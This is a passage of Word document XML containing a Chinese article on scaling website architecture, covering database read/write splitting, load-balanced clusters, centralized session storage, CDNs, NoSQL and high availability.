          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>需要更快更强大的 CPU；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC97679" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="112"/>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数据库服务器：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>需要更快的硬盘和更大的内存；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D2BA8E" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="112"/>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文件服务器：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>需要更大的硬盘；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4B8EB5"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数据库读写分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FAEADA4"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单台数据库也感觉快撑不住了，一般都会尝试做“读写分离”。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>由于大部分互联网“读多写少”的特性所决定的。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Salve的台数，取决于按业务评估的读写比例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B483809" w14:textId="55D80165"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196FC008" wp14:editId="7FF0D994">
            <wp:extent cx="6570980" cy="485902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0980" cy="4859020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9A615F"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数据库读写分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D81FB1"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简单有效、降低数据库单台压力；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B168389"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读写分离，增加程序难度，架构变复杂，维护难度增加；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79966AE0" w14:textId="5E44A90F"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数据库主从同步部署，扩展数据访问模块，实现读写分离；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8F0CD6"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应用服务集群</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEC3226" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="40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数据库层面是缓解了，但是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>应用程序层面也出现了瓶颈，由于访问量增大</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，加上早期程序员水平有限写的代码也很烂，人员流动性也大，很难去维护和优化。所以，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>很常用的办法还是“堆机器”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4CD5CB" w14:textId="59E12743"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6F26B930" wp14:editId="5E4360B0">
            <wp:extent cx="6570980" cy="524637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0980" cy="5246370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB27521"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应用出现瓶颈 负载均衡集群</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78314B52"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增加服务器和HA机制，系统性能及可用性得到保证；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BEF2E3"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应用之间缓存、Session一致性问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B446F85" w14:textId="16237151"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负载均衡；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7716F5"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通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>集群</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>解决高并发、海量数据问题的常用手段，实现系统的可伸缩性。通过负载均衡调度器，可将用户访问分发到集群中的某台 Server 上，应用服务器的负载压力不再成为整个网站的瓶颈。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B8A673"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lastRenderedPageBreak/>
        <w:t>集中式缓存、Session集中存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D63D8E"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加机器谁都会加，关键是加完之后得有效果，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>加完之后可能会引发一些问题。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>例如非常常见的：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>集群应用之间页面输出缓存和本地缓存一致性的问题，Session保存的问题……</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560437C4" w14:textId="65A35BCE"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3B9B4ED0" wp14:editId="35E8B66C">
            <wp:extent cx="7600315" cy="5955030"/>
            <wp:effectExtent l="0" t="0" r="63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02389" cy="5956655"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADC4978"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集中式缓存 Session集中存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3552C261"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应用之间缓存、Session一致，存储无限制，可以扩展；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E69C97"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不如本地缓存访问快，缓存服务器、Session服务器等仍存在单点问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFB76AE" w14:textId="42F7CFAB"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缓存服务器部署、Session集中存储方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D04D53E"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动静分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7571E1"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动静分离也是提高网站响应速度的一种常用方式。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>将动态请求与静态请求分离开，尽量减少对应用服务器的压力。同时，可以再进一步对静态请求，进行缓存，以加快响应速度。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>可以需要开发人员配合（把静态资源放独立站点下），也可以不需要开发人员配合（利用7层反向代理来处理，根据后缀名等信息来判断资源类型）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9EB414" w14:textId="298B753A"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502B5C73" wp14:editId="4012E2C8">
            <wp:extent cx="7780786" cy="49790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95029" cy="4988149"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6F6052"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使用动静分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421606D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>优点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>减轻应用负载压力，针对静态文件缓存；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565CD382" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>静态文件缓存更新失效问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB6BE8F" w14:textId="62118D0B" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>技术点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>动静分离、静态文件缓存方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B92E51"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反向代理和CDN加速网站响应</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3032C65F"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使用反向代理和CDN加速网站响应：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>CDN 和反向代理的基本原理都是缓存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，区别在于：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F10866" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="113"/>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CDN部署在网络提供商的机房；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DBFB63" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="113"/>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反向代理则部署在网站的中心机房；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D47BFA3"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使用 CDN 和反向代理的目的都是尽早返回数据给用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，一方面加快用户访问速度，另一方面也减轻后端服务器的负载压力。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648F8C4E" w14:textId="6BA57FD9"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2A868E48" wp14:editId="35412144">
            <wp:extent cx="7470923" cy="56807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88515" cy="5694087"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="72068019"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使用反向代理和 CDN 加速网站响应</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08ACEBFA"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减轻应用负载压力，异地缓存有效解决不同地方用户访问过慢的问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD0CEC6"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成本大幅增加，架构进一步复杂化，也维护难度进一步增大，静态文件缓存更新失效问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6D3145" w14:textId="6CE58FF6"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CDN、反向代理方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E081D60"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lastRenderedPageBreak/>
        <w:t>使用NoSQL和搜索引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585BC8B6" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="40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到这里，已经基本做到了DB层面和应用层面的横向扩展了，可以开始关注一些其它方面，例如：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>站内搜索的精准度，对DB的依赖，开始引入全文索引、NoSQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542FC9FA" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="40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NoSQL和搜索引擎都是源自互联网的技术手段，对可伸缩的分布式特性具有更好的支持。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>应用服务器则通过一个统一数据访问模块访问各种数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，减轻应用程序管理诸多数据源的麻烦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4864702F" w14:textId="2E9849E2"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070D2638" wp14:editId="45CD55A0">
            <wp:extent cx="8871044" cy="515620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96374" cy="5170923"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50309849"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使用NoSQL和搜索引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291B0C01"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降低DB依赖；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B31733E"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单点问题，谈不上高可用；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734F00DB" w14:textId="0DA8437B"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NoSQL、搜索引擎、分布式；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E0D7AE"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到目前为止，一个能够承载日均百万级访问量的中型网站架构基本介绍完了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BF0D72"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如何保证高可用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5073A315"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在做扩展满足了基本的性能需求后，我们会逐渐关注“可用性”（也就是我们通常听别人吹牛时说的SLA、几个9）。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>如何保证真正“高可用”，也是个难题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F444034"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对关键应用/服务，做集群冗余负载，这也是保证高可用比较常用的手段：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78601A73"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文件系统、数据库系统集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E3AEE2"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静态内容服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB8C661"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CDN服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219F4C82"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反向代理服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7746E5D3"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负载均衡调度器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75EBBE3E"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分布式NoSQL服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEE549F"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搜索引擎服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25313A98"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分布式缓存服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA1A32C" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="114"/>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分布式Session服务器集群；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFDB38B" w14:textId="7DA774C9"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1E7FDF74" wp14:editId="7767195E">
            <wp:extent cx="7942580" cy="524002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46597" cy="5242670"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DD85FC"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使用集群冗余负载 保证高可用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FC45B4"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集群负载，保证高可用；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31755906"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数据一致性、数据有状态问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5769C7A6" w14:textId="790AE162"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负载调度器、集群方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101D0080"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截止目前为止，都没有怎么去改动应用程序的架构，或者说通俗点，都不怎么需要大面积的修改代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A8F622"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如果上面那些手段都用光了，还是支撑不住怎么办？不停的加机器也不是办法啊？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F742B4"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lastRenderedPageBreak/>
        <w:t>应用垂直拆分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC6D0BF"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随着业务越来越复杂，网站的功能越来越多，虽然部署层面是采用的集群，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>但是应用程序架构层面还是“集中式”的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，这样会导致很多耦合，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>不便于开发、维护，而且容易“一荣俱损”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。所以，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>通常会把网站拆分出不同的子站点来单独宿主。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09433C08"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通过分而治之的手段将整个网站业务分成不同的产品线，如首页、商铺、订单、卖家、买家等</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>拆分成不同的产品线，分归不同的业务团队负责</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
